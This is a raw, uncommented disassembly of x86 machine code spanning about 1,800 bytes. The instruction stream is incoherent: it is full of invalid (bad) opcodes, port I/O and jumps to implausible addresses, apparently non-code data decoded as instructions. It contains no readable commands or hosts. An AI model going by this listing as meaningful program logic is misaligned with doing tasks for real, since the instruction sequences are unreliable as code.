  419e97:	stc    
  419e98:	int3   
  419e99:	es cmp esp,esp
  419e9c:	out    0x10,al
  419e9e:	push   ss
  419e9f:	cmc    
  419ea0:	adc    DWORD PTR [eax],0x57
  419ea3:	in     eax,0x87
  419ea5:	pop    ss
  419ea6:	xor    edx,edi
  419ea8:	(bad)  
  419ea9:	pop    ss
  419eaa:	adc    bh,dl
  419eac:	les    ebx,FWORD PTR [edx]
  419eae:	pop    ds
  419eaf:	lock out 0x2f,al
  419eb2:	cmc    
  419eb3:	jecxz  0x419efc
  419eb5:	adc    al,0xe4
  419eb7:	out    0x58,eax
  419eb9:	and    ebp,edx
  419ebb:	int3   
  419ebc:	dec    ebx
  419ebd:	and    eax,0x3432c6e1
  419ec2:	xor    edx,ebx
  419ec4:	xor    eax,0x27d60542
  419ec9:	ss repnz fdiv st(7),st
  419ecd:	and    al,0x10
  419ecf:	fisubr WORD PTR [edi+0x16]
  419ed2:	or     al,0xfb
  419ed4:	(bad)  
  419ed5:	jmp    0x15b28dd7
  419eda:	or     al,0xed
  419edc:	imul   edi,DWORD PTR [ecx],0x54
  419edf:	cmc    
  419ee0:	addr16 jmp 0x8b57d4c
  419ee6:	jno    0x419ece
  419ee8:	jno    0x419ed3
  419eea:	(bad)  
  419eeb:	fidiv  WORD PTR [eax-0x6]
  419eee:	and    ebp,esp
  419ef0:	jno    0x419ef7
  419ef2:	sub    eax,0xda6cd1
  419ef7:	cs iret 
  419ef9:	pop    esi
  419efa:	int3   
  419efb:	push   ecx
  419efc:	or     DWORD PTR [ebx-0x26],edx
  419eff:	adc    ebx,edi
  419f01:	dec    ebp
  419f02:	enter  0xea49,0xff
  419f06:	call   0xc511:0xb56cf211
  419f0d:	mov    bx,0xe811
  419f11:	jae    0x419ed1
  419f13:	sbb    al,0xf6
  419f15:	(bad)  
  419f16:	mov    eax,0xaf73fb1b
  419f1b:	and    edx,esi
  419f1d:	popa   
  419f1e:	mov    WORD PTR [ecx+ecx*1+0x46],es
  419f22:	mov    edx,0x7d6cfb62
  419f27:	cmp    ebp,eax
  419f29:	ins    BYTE PTR es:[edi],dx
  419f2a:	lea    esi,[edx]
  419f2c:	fsubr  DWORD PTR [edi+ecx*4+0x3e]
  419f30:	hlt    
  419f31:	pop    esi
  419f32:	jnp    0x419f85
  419f34:	fisttp QWORD PTR [edx+0x48]
  419f37:	daa    
  419f38:	cmc    
  419f39:	dec    di
  419f3b:	(bad)  
  419f3c:	int    0x71
  419f3e:	inc    eax
  419f3f:	dec    esi
  419f40:	sti    
  419f41:	jbe    0x419f80
  419f43:	sub    eax,0x5a0030dd
  419f48:	ret    
  419f49:	fs je  0x419f5a
  419f4c:	sbb    DWORD PTR [eax+0x2e],esi
  419f4f:	icebp  
  419f50:	and    ah,BYTE PTR [ebp+0x0]
  419f53:	es leave 
  419f55:	dec    esi
  419f56:	imul   ebx,DWORD PTR [eax+ebp*1],0x21002e6f
  419f5d:	and    esp,DWORD PTR [ebp+0x0]
  419f60:	fs aas 
  419f62:	popa   
  419f63:	je     0x419fb1
  419f65:	adc    esp,DWORD PTR [ebp+0x76]
  419f68:	sub    eax,0x1b615005
  419f6d:	adc    al,0x53
  419f6f:	outs   dx,DWORD PTR ds:[esi]
  419f70:	or     bl,BYTE PTR ds:0x150a5500
  419f76:	add    BYTE PTR [ebp-0x25],dl
  419f79:	sub    DWORD PTR [edx+0x4e],esi
  419f7c:	jmp    0xaa4200a2
  419f81:	pop    ds
  419f82:	imul   esi,DWORD PTR [esp+ecx*4+0x1d],0x72
  419f87:	gs jmp 0x419f96
  419f8a:	imul   esi,DWORD PTR [edx-0xf],0x8
  419f8e:	push   eax
  419f8f:	outs   dx,DWORD PTR ds:[esi]
  419f90:	mov    cl,BYTE PTR [eax+eax*1]
  419f93:	push   ebx
  419f94:	xchg   DWORD PTR [edx],ebp
  419f96:	je     0x41a00f
  419f98:	test   eax,0x7b5c6116
  419f9d:	pop    ds
  419f9e:	jno    0x41a014
  419fa0:	mov    al,0x68
  419fa2:	dec    edi
  419fa3:	imul   edi,DWORD PTR [esi-0x43df8dd7],0xa6685f29
  419fad:	pop    ds
  419fae:	ins    BYTE PTR es:[edi],dx
  419faf:	outs   dx,DWORD PTR ds:[esi]
  419fb0:	mov    edi,0xb473611d
  419fb5:	aaa    
  419fb6:	popa   
  419fb7:	bound  ecx,QWORD PTR [ebx+edx*1+0x65]
  419fbb:	jbe    0x419faa
  419fbd:	xor    BYTE PTR [edi],bh
  419fbf:	outs   dx,DWORD PTR ds:[esi]
  419fc0:	add    BYTE PTR [ecx],dh
  419fc2:	les    ebx,FWORD PTR [ecx]
  419fc4:	arpl   dx,dx
  419fc6:	aad    0x18
  419fc8:	ins    DWORD PTR es:[edi],dx
  419fc9:	iret   
  419fca:	ds add al,0x51
  419fcd:	int3   
  419fce:	aas    
  419fcf:	adc    ah,BYTE PTR [ebx-0x3d]
  419fd2:	sbb    eax,0x71cc7009
  419fd7:	aas    
  419fd8:	push   esp
  419fd9:	loope  0x41a02c
  419fdb:	inc    esp
  419fdc:	dec    ebp
  419fdd:	out    0x35,eax
  419fdf:	ss dec ebp
  419fe1:	jge    0x41a055
  419fe3:	aas    
  419fe4:	push   esp
  419fe5:	sub    DWORD PTR [edi],0x54314e37
  419feb:	adc    DWORD PTR [edx-0x71],esi
  419fee:	jb     0x41a015
  419ff0:	push   eax
  419ff1:	add    DWORD PTR [ebx],0x22
  419ff4:	addr16 xchg ebp,eax
  419ff6:	add    eax,0x64b20013
  419ffb:	test   DWORD PTR ds:0x679c9ea7,ecx
  41a001:	bound  eax,QWORD PTR [ebx+0x565d6887]
  41a007:	adc    DWORD PTR [edx],edi
  41a009:	push   cs
  41a00a:	adc    eax,DWORD PTR [eax+ebp*2]
  41a00d:	pop    ebp
  41a00e:	mov    dh,0x11
  41a010:	jno    0x41a01d
  41a012:	add    edx,edi
  41a014:	dec    DWORD PTR [esi+esi*4+0x11]
  41a018:	cmp    cl,BYTE PTR [esi]
  41a01a:	push   ebx
  41a01b:	add    DWORD PTR [ebp+0x41],ebp
  41a01e:	test   DWORD PTR [ebx],edx
  41a020:	pop    edi
  41a021:	xor    DWORD PTR [ebx+0xd006e22],ebx
  41a027:	mov    esp,0x72255f1d
  41a02c:	sub    BYTE PTR [ecx+0x6],dl
  41a02f:	test   BYTE PTR ds:0x1e001075,cl
  41a035:	pop    esp
  41a036:	test   BYTE PTR [ecx],0x1e
  41a039:	jb     0x41a04b
  41a03b:	or     DWORD PTR [edi],eax
  41a03d:	xor    eax,0x1152e304
  41a042:	push   cs
  41a043:	test   DWORD PTR [ebx+0x4],0x1059e9f5
  41a04a:	adc    ebp,eax
  41a04c:	dec    edi
  41a04d:	push   ss
  41a04e:	shl    bh,cl
  41a050:	xor    bl,BYTE PTR [ecx]
  41a052:	ret    
  41a053:	add    edx,edi
  41a055:	add    esi,ebp
  41a057:	jmp    0xd252b095
  41a05c:	adc    al,0x15
  41a05e:	mov    ebp,0x51180ae9
  41a063:	fld    DWORD PTR [edi]
  41a065:	adc    BYTE PTR [ecx-0x6debe1f7],bl
  41a06b:	test   DWORD PTR [edi],0x2bd56eda
  41a071:	cmp    BYTE PTR [ebp-0xa],ch
  41a074:	(bad)  
  41a075:	push   ds
  41a076:	xchg   ebp,eax
  41a077:	in     eax,dx
  41a078:	or     bl,BYTE PTR [ecx]
  41a07a:	and    esp,0xea9027d4
  41a080:	retf   
  41a081:	push   ss
  41a082:	mov    gs,ebx
  41a084:	retf   0x5c03
  41a087:	lock fstp DWORD PTR [esi]
  41a08a:	add    BYTE PTR [edi-0xb],dl
  41a08d:	mov    dh,0x14
  41a08f:	arpl   bx,si
  41a091:	mov    ecx,0xc4f050d9
  41a096:	add    esp,DWORD PTR [ebp-0x38]
  41a099:	leave  
  41a09a:	push   ds
  41a09b:	jae    0x41a06d
  41a09d:	mov    edx,0x84ea6003
  41a0a2:	mov    eax,tr5
  41a0a5:	cwde   
  41a0a6:	push   ds
  41a0a7:	add    eax,0xf31e89c8
  41a0ac:	iret   
  41a0ad:	call   0xe003:0x93d6ea03
  41a0b4:	leave  
  41a0b5:	jmp    FWORD PTR [esi-0x64c12baa]
  41a0bb:	aas    
  41a0bc:	fld    QWORD PTR [eax+0x55]
  41a0bf:	dec    esp
  41a0c0:	clc    
  41a0c1:	jo     0x41a107
  41a0c3:	inc    edx
  41a0c4:	fst    QWORD PTR [ebx+0x50]
  41a0c7:	cmp    eax,0x13404be6
  41a0cc:	fnstsw WORD PTR [eax+0x2a]
  41a0cf:	repz sub DWORD PTR [esi-0x5],eax
  41a0d3:	repz cmp BYTE PTR [esi+0x4],al
  41a0d7:	jne    0x41a103
  41a0d9:	aaa    
  41a0da:	cmc    
  41a0db:	pop    ecx
  41a0dc:	ss aas 
  41a0de:	sub    dl,dh
  41a0e0:	sub    eax,0x366f2a42
  41a0e5:	sub    ebx,ebp
  41a0e7:	std    
  41a0e8:	cmp    dh,BYTE PTR [esi]
  41a0ea:	aad    0x71
  41a0ec:	aaa    
  41a0ed:	xor    eax,0x34e6002f
  41a0f2:	xor    eax,0x4cd832fc
  41a0f7:	das    
  41a0f8:	inc    ecx
  41a0f9:	aam    0x3e
  41a0fb:	sbb    esi,DWORD PTR [eax-0x23]
  41a0fe:	inc    eax
  41a0ff:	aad    0x4d
  41a101:	clc    
  41a102:	jo     0x41a0c8
  41a104:	inc    ebx
  41a105:	fst    QWORD PTR [ebx-0x30]
  41a108:	inc    edx
  41a109:	out    0x4b,al
  41a10b:	rcl    BYTE PTR [eax],0xdd
  41a10e:	js     0x41a110
  41a110:	jo     0x41a14c
  41a112:	xor    esi,esp
  41a114:	loope  0x41a14d
  41a116:	aaa    
  41a117:	add    al,0x70
  41a119:	sub    dh,BYTE PTR [edx]
  41a11b:	sti    
  41a11c:	fnstenv ds:0x2ee7dc35
  41a122:	inc    edx
  41a123:	stos   BYTE PTR es:[edi],al
  41a124:	jg     0x41a158
  41a126:	sub    ebp,DWORD PTR [esi+esi*2+0x5cd43231]
  41a12d:	inc    ecx
  41a12e:	xor    BYTE PTR [eax],al
  41a130:	xlat   BYTE PTR ds:[ebx]
  41a131:	push   esi
  41a132:	das    
  41a133:	inc    ebx
  41a134:	or     eax,0xb697306
  41a139:	sub    DWORD PTR [esi+0x74],esp
  41a13c:	clc    
  41a13d:	push   ss
  41a13e:	jb     0x41a1b6
  41a140:	fist   DWORD PTR [edx+0x66]
  41a143:	outs   dx,BYTE PTR ds:[esi]
  41a144:	add    DWORD PTR ds:0x280b6973,eax
  41a14a:	data16 je 0x41a145
  41a14d:	push   edx
  41a14e:	data16 outs dx,BYTE PTR ds:[esi]
  41a150:	add    DWORD PTR ds:0x28005446,eax
  41a156:	sub    ebp,DWORD PTR [ebx+0x79]
  41a159:	stc    
  41a15a:	sbb    DWORD PTR [ecx+0x72],esp
  41a15d:	sbb    esi,DWORD PTR ds:[eax+esi*2+0x48]
  41a162:	cmp    edx,DWORD PTR [eax+edx*2+0x66]
  41a166:	and    BYTE PTR [ebp+0x61],dh
  41a169:	aaa    
  41a16a:	sub    dh,BYTE PTR [edx+0x2e]
  41a16d:	cmp    DWORD PTR [eax+eax*1],ebp
  41a170:	pop    esp
  41a171:	cmp    dl,BYTE PTR ds:0x3c3f6e65
  41a177:	imul   esp,DWORD PTR [esi+0x4],0x5f
  41a17b:	pusha  
  41a17c:	outs   dx,DWORD PTR ds:[esi]
  41a17d:	std    
  41a17e:	or     al,0x6e
  41a180:	jae    0x41a15d
  41a182:	pop    ebx
  41a183:	sub    esp,DWORD PTR [esp+edi*8+0x20]
  41a187:	add    BYTE PTR [esi-0x55],cl
  41a18a:	cmp    ebx,DWORD PTR [ebx+0x49]
  41a18d:	sahf   
  41a18e:	adc    eax,0x3b9e0074
  41a193:	dec    edi
  41a194:	pop    edi
  41a195:	stos   DWORD PTR es:[edi],eax
  41a196:	adc    al,0x71
  41a198:	je     0x41a18e
  41a19a:	pop    ds
  41a19b:	jae    0x41a20b
  41a19d:	enter  0x4f3e,0x53
  41a1a1:	mov    ch,BYTE PTR ds:0x4886656f
  41a1a7:	pop    esp
  41a1a8:	inc    esp
  41a1a9:	xor    DWORD PTR [ebp-0x72ea92de],eax
  41a1af:	aas    
  41a1b0:	jae    0x41a1c1
  41a1b2:	mov    BYTE PTR [eax],ah
  41a1b4:	jb     0x41a1e7
  41a1b6:	xchg   ebx,eax
  41a1b7:	inc    eax
  41a1b8:	inc    ecx
  41a1b9:	add    al,bh
  41a1bb:	xchg   ebp,eax
  41a1bc:	inc    eax
  41a1bd:	dec    ebx
  41a1be:	fisubr WORD PTR [edi+0x390c630f]
  41a1c4:	adc    BYTE PTR [ebx-0x24],ah
  41a1c7:	popa   
  41a1c8:	xor    DWORD PTR [ecx+0x20],ecx
  41a1cb:	adc    DWORD PTR [ebx],esp
  41a1cd:	inc    ebp
  41a1ce:	aam    0xdd
  41a1d0:	cmp    BYTE PTR [esi-0x23],ch
  41a1d3:	les    edx,FWORD PTR [ecx]
  41a1d5:	outs   dx,BYTE PTR ds:[esi]
  41a1d6:	rol    ch,1
  41a1d8:	ss arpl ax,cx
  41a1db:	adc    bl,BYTE PTR [eax]
  41a1dd:	ins    DWORD PTR es:[edi],dx
  41a1de:	lds    esp,FWORD PTR [ecx+0x31]
  41a1e1:	dec    ecx
  41a1e2:	add    BYTE PTR [ecx+0x24],dl
  41a1e5:	aas    
  41a1e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1e7:	push   ds
  41a1e8:	sbb    al,0x63
  41a1ea:	xchg   edi,eax
  41a1eb:	push   ss
  41a1ec:	sbb    DWORD PTR [ecx-0x70],esp
  41a1ef:	push   ds
  41a1f0:	sbb    eax,0xd13b8100
  41a1f5:	bound  ebp,QWORD PTR cs:[esi]
  41a1f8:	xor    bl,BYTE PTR [ebp+0x6d]
  41a1fb:	add    eax,0x7278721f
  41a200:	or     eax,0xd2bb6100
  41a205:	mov    ?,WORD PTR cs:[eax-0x4cb39cf1]
  41a20c:	adc    eax,0x162656d
  41a211:	add    BYTE PTR [ecx],dh
  41a213:	bound  eax,QWORD PTR [ecx]
  41a215:	add    BYTE PTR [ecx],dh
  41a217:	bound  eax,QWORD PTR [ecx]
  41a219:	add    BYTE PTR [ecx],dh
  41a21b:	bound  eax,QWORD PTR [ecx]
  41a21d:	add    BYTE PTR [eax],al
  41a21f:	xor    DWORD PTR [edx+0x1],esp
  41a222:	add    BYTE PTR [ecx],dh
  41a224:	or     edi,esp
  41a226:	add    esi,DWORD PTR [ecx]
  41a228:	or     edi,esp
  41a22a:	add    esi,DWORD PTR [ecx]
  41a22c:	or     edi,esp
  41a22e:	add    esi,DWORD PTR [ecx]
  41a230:	or     edi,esp
  41a232:	add    esp,DWORD PTR [eax]
  41a234:	cli    
  41a235:	xchg   edx,eax
  41a236:	sbb    al,BYTE PTR ds:0x12d5b9ee
  41a23c:	in     eax,0x82
  41a23e:	add    eax,DWORD PTR [eax]
  41a240:	cli    
  41a241:	jp     0x41a25d
  41a243:	std    
  41a244:	in     eax,dx
  41a245:	sbb    DWORD PTR ds:0x1643f8dc,esp
  41a24b:	xor    esp,edi
  41a24d:	push   edi
  41a24e:	sbb    dh,dl
  41a250:	cld    
  41a251:	inc    ebx
  41a252:	shl    ebp,1
  41a254:	jmp    0x41a2a8
  41a256:	adc    eax,0x10e6edc0
  41a25b:	(bad)  
  41a25c:	in     al,0x3f
  41a25e:	adc    dl,dl
  41a260:	cmp    ecx,DWORD PTR [esi]
  41a262:	adc    al,0xc3
  41a264:	in     eax,dx
  41a265:	push   ss
  41a266:	and    esp,DWORD PTR [ebx-0x69ef1914]
  41a26c:	in     eax,0xff
  41a26e:	setb   BYTE PTR [edx]
  41a271:	adc    DWORD PTR cs:[ebp-0x7ffc0914],ebx
  41a278:	clc    
  41a279:	or     bl,BYTE PTR [ebx]
  41a27b:	jge    0x41a269
  41a27d:	mov    ecx,0xfae69024
  41a282:	push   cs
  41a283:	add    BYTE PTR [edx+0x6621c5e7],cl
  41a289:	std    
  41a28a:	ret    
  41a28b:	adc    BYTE PTR [ecx],dh
  41a28d:	cli    
  41a28e:	xlat   BYTE PTR ds:[ebx]
  41a28f:	pop    ss
  41a290:	push   esi
  41a291:	std    
  41a292:	ret    
  41a293:	shl    BYTE PTR [ebp-0x16],1
  41a296:	aad    0x17
  41a298:	inc    edx
  41a299:	in     al,0xcc
  41a29b:	and    al,0x53
  41a29d:	in     eax,0xff
  41a29f:	lds    edx,FWORD PTR [eax]
  41a2a1:	or     DWORD PTR [eax],eax
  41a2a3:	mov    esp,0x9870f31d
  41a2a8:	inc    esi
  41a2a9:	out    dx,al
  41a2aa:	jae    0x41a230
  41a2ac:	and    DWORD PTR [esp+eiz*2],0x71094685
  41a2b3:	cwde   
  41a2b4:	ds out dx,al
  41a2b6:	jae    0x41a244
  41a2b8:	popa   
  41a2b9:	aad    0x6c
  41a2bb:	jns    0x41a2e4
  41a2bd:	out    0xff,eax
  41a2bf:	jns    0x41a2e4
  41a2c1:	in     eax,0x66
  41a2c3:	jne    0x41a2dc
  41a2c5:	cmp    BYTE PTR [ebp+0x4a],bl
  41a2c8:	popa   
  41a2c9:	in     eax,0x70
  41a2cb:	inc    esp
  41a2cc:	sub    eax,0x4c456ef8
  41a2d1:	cli    
  41a2d2:	bound  ebx,QWORD PTR [edx]
  41a2d4:	push   edx
  41a2d5:	out    0x71,al
  41a2d7:	dec    esp
  41a2d8:	inc    ebp
  41a2d9:	xlat   BYTE PTR ds:[ebx]
  41a2da:	jno    0x41a320
  41a2dc:	sub    eax,0x4c456ef8
  41a2e1:	cli    
  41a2e2:	(bad)  
  41a2e3:	cli    
  41a2e4:	push   ebx
  41a2e5:	stc    
  41a2e6:	jae    0x41a2f4
  41a2e8:	add    BYTE PTR ds:0x21187276,ah
  41a2ee:	out    dx,eax
  41a2ef:	jae    0x41a2fd
  41a2f1:	data16 aam 0x60
  41a2f4:	inc    BYTE PTR [esi]
  41a2f6:	sti    
  41a2f7:	push   0x17
  41a2f9:	adc    ch,al
  41a2fb:	jbe    0x41a2f2
  41a2fd:	sbb    ecx,edi
  41a2ff:	(bad)  
  41a300:	stc    
  41a301:	add    eax,0x9f566e2
  41a306:	cmp    DWORD PTR [ebp-0x36],ebx
  41a309:	jecxz  0x41a2ec
  41a30b:	jb     0x41a2d9
  41a30d:	loopne 0x41a2e3
  41a30f:	popa   
  41a310:	(bad)
  41a313:	(bad)  
  41a314:	call   0x41ac4b
  41a319:	fmul   DWORD PTR [ecx]
  41a31b:	add    BYTE PTR [eax],al
  41a31d:	fmul   DWORD PTR [ecx]
  41a31f:	add    BYTE PTR [eax],al
  41a321:	enter  0x9,0x0
  41a325:	enter  0x9,0x0
  41a329:	cwde   
  41a32a:	or     DWORD PTR [eax],eax
  41a32c:	add    BYTE PTR [eax-0x77fffff7],bl
  41a332:	or     DWORD PTR [eax],eax
  41a334:	add    BYTE PTR [eax-0x41909087],cl
  41a33a:	imul   esp,DWORD PTR fs:[ebp+0xb],0xb16e6538
  41a342:	or     DWORD PTR [eax+0x72],edx
  41a345:	neg    DWORD PTR [edi+0x66]
  41a348:	ins    BYTE PTR es:[edi],dx
  41a349:	std    
  41a34a:	or     al,0x45
  41a34c:	jae    0x41a34e
  41a34e:	sub    ah,BYTE PTR [eax+0x69]
  41a351:	popa   
  41a352:	cld    
  41a353:	arpl   WORD PTR [ebx+0x65],si
  41a356:	dec    eax
  41a357:	pop    ecx
  41a358:	pop    esi
  41a359:	je     0x41a33b
  41a35b:	or     al,0x50
  41a35d:	popa   
  41a35e:	cld    
  41a35f:	fs push ecx
  41a361:	outs   dx,DWORD PTR ds:[esi]
  41a362:	or     eax,0xf8006275
  41a367:	jle    0x41a3cb
  41a369:	dec    bx
  41a36b:	aaa    
  41a36c:	push   0x73
  41a36e:	sbb    BYTE PTR [esi+eiz*2+0x67],bh
  41a372:	ss js  0x41a3e0
  41a375:	jae    0x41a34d
  41a377:	jnp    0x41a3e7
  41a379:	ins    BYTE PTR es:[edi],dx
  41a37a:	and    DWORD PTR [ecx+0x62],esi
  41a37d:	add    BYTE PTR [ebx],cl
  41a37f:	data16 outs dx,BYTE PTR fs:[esi]
  41a382:	aaa    
  41a383:	ja     0x41a3f5
  41a385:	cs cld 
  41a387:	jo     0x41a3fa
  41a389:	add    BYTE PTR [ebx],cl
  41a38b:	data16 outs dx,BYTE PTR fs:[esi]
  41a38e:	idiv   DWORD PTR [edx+0x70]
  41a391:	xor    dh,BYTE PTR [ecx]
  41a393:	or     al,0xf8
  41a395:	ja     0x41a3f4
  41a397:	(bad)  
  41a398:	mul    BYTE PTR [esi+0x56]
  41a39b:	pop    esp
  41a39c:	repnz ins DWORD PTR es:[edi],dx
  41a39e:	inc    edx
  41a39f:	outs   dx,DWORD PTR ds:[esi]
  41a3a0:	das    
  41a3a1:	je     0x41a3dc
  41a3a3:	mov    dh,0x1
  41a3a5:	and    DWORD PTR [ebx],eax
  41a3a7:	aas    
  41a3a8:	add    DWORD PTR [ecx],esp
  41a3aa:	arpl   WORD PTR [esi-0x729cdeff],ax
  41a3b0:	add    DWORD PTR [ecx+0x0],edx
  41a3b3:	hlt    
  41a3b4:	lods   eax,DWORD PTR ds:[esi]
  41a3b5:	enter  0xfd40,0x41
  41a3b9:	jmp    0xef37a62a
  41a3be:	pop    esi
  41a3bf:	adc    al,0x8d
  41a3c1:	sub    eax,0xe68c1420
  41a3c6:	jno    0x41a3c0
  41a3c8:	icebp  
  41a3c9:	hlt    
  41a3ca:	(bad)  
  41a3cb:	aad    0x34
  41a3cd:	repz (bad) 
  41a3d0:	ret    
  41a3d1:	loopne 0x41a43d
  41a3d3:	aam    0xd
  41a3d5:	and    al,0x63
  41a3d7:	(bad)  
  41a3d8:	mov    esi,0x35c176f5
  41a3dd:	in     eax,0x63
  41a3df:	loope  0x41a3a1
  41a3e1:	bnd jo 0x41a3aa
  41a3e4:	retf   0x63f5
  41a3e7:	adc    DWORD PTR [esi+edx*8],ebp
  41a3ea:	dec    esp
  41a3eb:	jl     0x41a42f
  41a3ed:	out    dx,al
  41a3ee:	ins    BYTE PTR es:[edi],dx
  41a3ef:	stos   DWORD PTR es:[edi],eax
  41a3f0:	xor    esi,eax
  41a3f2:	ins    BYTE PTR es:[edi],dx
  41a3f3:	xchg   esi,eax
  41a3f4:	or     edx,esi
  41a3f6:	jo     0x41a429
  41a3f8:	sub    al,0xe9
  41a3fa:	jno    0x41a390
  41a3fc:	add    al,0xef
  41a3fe:	ja     0x41a431
  41a400:	push   ss
  41a401:	int    0x6c
  41a403:	jnp    0x41a40e
  41a405:	lock imul edx,DWORD PTR [eax+0x6366ca06],0x9
  41a40d:	int3   
  41a40e:	jmp    0x3fc9568
  41a413:	and    ah,0xcc
  41a416:	test   DWORD PTR [eax],0xe6d8ea5d
  41a41c:	push   0xffffffc6
  41a41e:	aad    0xfd
  41a420:	dec    edi
  41a421:	in     eax,0xca
  41a423:	loop   0x41a3e3
  41a425:	and    al,0x4
  41a427:	das    
  41a428:	xor    ebx,ebp
  41a42a:	mov    dl,0xf3
  41a42c:	push   0x1903d624
  41a431:	std    
  41a432:	xchg   edx,eax
  41a433:	repz pop eax
  41a435:	and    al,0xc6
  41a437:	add    ecx,DWORD PTR [ecx]
  41a439:	std    
  41a43a:	xchg   edx,eax
  41a43b:	repz add DWORD PTR [edi],ebp
  41a43e:	(bad)  
  41a43f:	xor    BYTE PTR [ecx],dh
  41a441:	jmp    0x41a4b5
  41a443:	repz dec esp
  41a445:	or     DWORD PTR [ebp-0x5b11ff16],ecx
  41a44b:	xlat   BYTE PTR ds:[ebx]
  41a44c:	(bad)  
  41a44d:	test   DWORD PTR [edi-0x8],0xe80cf7d3
  41a454:	(bad)  
  41a455:	cld    
  41a456:	out    0xd4,al
  41a458:	shr    ecx,cl
  41a45a:	sbb    esi,ecx
  41a45c:	(bad)  
  41a45e:	dec    ebx
  41a45f:	sti    
  41a460:	inc    esi
  41a461:	iret   
  41a462:	sub    esi,ecx
  41a464:	mov    eax,0xd7f042e1
  41a469:	aam    0x19
  41a46b:	out    0x8f,eax
  41a46d:	les    edx,FWORD PTR ds:0x1fec99f2
  41a473:	loopne 0x41a493
  41a475:	int    0x2
  41a477:	icebp  
  41a478:	xchg   ecx,eax
  41a479:	fsubrp st(6),st
  41a47b:	fild   WORD PTR [eax]
  41a47d:	je     0x41a464
  41a47f:	adc    eax,0x28d599e5
  41a484:	test   BYTE PTR [ebp+0xff9fffa],0xf9
  41a48b:	pop    ebx
  41a48c:	jmp    0xd0bb8a90
  41a491:	(bad)  
  41a492:	ficomp WORD PTR [esi-0x17]
  41a495:	(bad)  
  41a496:	mov    edi,0xdecbd36c
  41a49b:	imul   ecx,eax,0xffffffee
  41a49e:	ret    0xd671
  41a4a1:	fsubr  st,st(3)
  41a4a3:	imul   eax,esp,0xffffffc5
  41a4a6:	into   
  41a4a7:	call   FWORD PTR [ecx-0x498c133f]
  41a4ad:	xchg   ebx,eax
  41a4ae:	clc    
  41a4af:	(bad)  
  41a4b0:	lds    esi,FWORD PTR [esi-0x19]
  41a4b3:	bound  ecx,QWORD PTR [edx-0x46ac3376]
  41a4b9:	xor    dh,BYTE PTR [edx]
  41a4bb:	jo     0x41a456
  41a4bd:	jbe    0x41a4aa
  41a4bf:	jno    0x41a4aa
  41a4c1:	jbe    0x41a4a8
  41a4c3:	pusha  
  41a4c4:	mov    BYTE PTR [esi+0x327b66c6],cl
  41a4ca:	out    0x6c,eax
  41a4cc:	jle    0x41a52b
  41a4ce:	fistp  WORD PTR [esi+0x5b]
  41a4d1:	pop    edx
  41a4d2:	and    al,0x64
  41a4d4:	dec    eax
  41a4d5:	pop    ecx
  41a4d6:	jb     0x41a52a
  41a4d8:	inc    eax
  41a4d9:	pop    ecx
  41a4da:	out    0x46,eax
  41a4dc:	aas    
  41a4dd:	push   edi
  41a4de:	in     eax,0x2d
  41a4e0:	sbb    BYTE PTR [eax],al
  41a4e2:	outs   dx,DWORD PTR ds:[esi]
  41a4e3:	ret    0x2dff
  41a4e6:	dec    ecx
  41a4e7:	jmp    0x41a556
  41a4e9:	jmp    0x3eb7785a
  41a4ee:	and    ebp,ebx
  41a4f0:	jae    0x41a4fe
  41a4f2:	and    ah,BYTE PTR [esp+eiz*2]
  41a4f5:	or     BYTE PTR [ecx],bl
  41a4f7:	jb     0x41a54f
  41a4f9:	add    BYTE PTR [edi],al
  41a4fb:	int3   
  41a4fc:	push   ebx
  41a4fd:	cmp    DWORD PTR ds:0x40066f8,esi
  41a503:	popa   
  41a504:	jo     0x41a534
  41a506:	xor    al,0x67
  41a508:	std    
  41a509:	inc    edx
  41a50a:	dec    esp
  41a50b:	push   esi
  41a50c:	inc    esi
  41a50d:	inc    esp
  41a50e:	cmp    al,0x6e
  41a510:	xor    DWORD PTR cs:[ebx+0x4437443c],ebx
  41a517:	cmp    al,0x29
  41a519:	inc    ecx
  41a51a:	inc    ecx
  41a51b:	xor    BYTE PTR [edx+0x2d],al
  41a51e:	sub    DWORD PTR [esp+eiz*2],edi
  41a521:	xor    bl,BYTE PTR ds:0xb8383d35
  41a527:	cmp    BYTE PTR [eax],dh
  41a529:	xor    al,al
  41a52b:	xor    eax,0x36da443d
  41a530:	xor    al,BYTE PTR [esi-0x2a]
  41a533:	cmp    DWORD PTR [ecx+0x5c],edi
  41a536:	loope  0x41a59b
  41a538:	dec    ebp
  41a539:	jb     0x41a4ea
  41a53b:	push   ax
  41a53d:	gs stos BYTE PTR es:[edi],al
  41a53f:	jnp    0x41a5a3
  41a541:	jb     0x41a50e
  41a543:	aaa    
  41a544:	add    BYTE PTR [ebx+0x0],dh
  41a547:	mov    ch,0x77
  41a549:	jae    0x41a5b0
  41a54b:	cli    
  41a54c:	jbe    0x41a579
  41a54e:	js     0x41a53d
  41a550:	popa   
  41a551:	std    
  41a552:	pop    ebx
  41a553:	push   ss
  41a554:	push   ecx
  41a555:	dec    ebp
  41a556:	inc    edi
  41a557:	cmc    
  41a558:	jo     0x41a5cb
  41a55a:	gs cli 
  41a55c:	or     al,0x41
  41a55e:	push   ebx
  41a55f:	add    al,0x61
  41a561:	pop    edi
  41a562:	xor    bl,BYTE PTR [esi]
  41a564:	popa   
  41a565:	pop    esi
  41a566:	je     0x41a5b0
  41a568:	pop    esp
  41a569:	inc    ecx
  41a56a:	popa   
  41a56b:	hlt    
  41a56c:	imul   ebp,DWORD PTR [ebx],0x64
  41a56f:	jns    0x41a5e2
  41a571:	std    
  41a572:	pop    ebx
  41a573:	push   ebp
  41a574:	jl     0x41a5e7
  41a576:	jae    0x41a5a7
  41a578:	addr16 jno 0x41a5d7
  41a57b:	xor    DWORD PTR [ecx],esp
  41a57d:	rol    BYTE PTR [ebp+0x65],1
  41a580:	xor    al,BYTE PTR [edi+eax*2]
  41a583:	xchg   edi,eax
  41a584:	outs   dx,BYTE PTR ds:[esi]
  41a585:	call   0xf84734fb
  41a58a:	pop    ds
  41a58b:	ins    BYTE PTR es:[edi],dx
  41a58c:	jp     0x41a57f
  41a58e:	imul   ebx,DWORD PTR [esi+0x74],0xffffffe8
  41a592:	jno    0x41a5c5
  41a594:	scas   eax,DWORD PTR es:[edi]
  41a595:	in     al,dx
  41a596:	ins    DWORD PTR es:[edi],dx
  41a597:	dec    eax
  41a598:	inc    eax
  41a599:	call   0xe2831811
  41a59e:	addr16 push esp
  41a5a0:	mov    ds:0x3d4d62ef,eax
  41a5a5:	jmp    0x41a61a
  41a5a7:	dec    eax
  41a5a8:	inc    ecx
  41a5a9:	in     eax,dx
  41a5aa:	jo     0x41a5ac
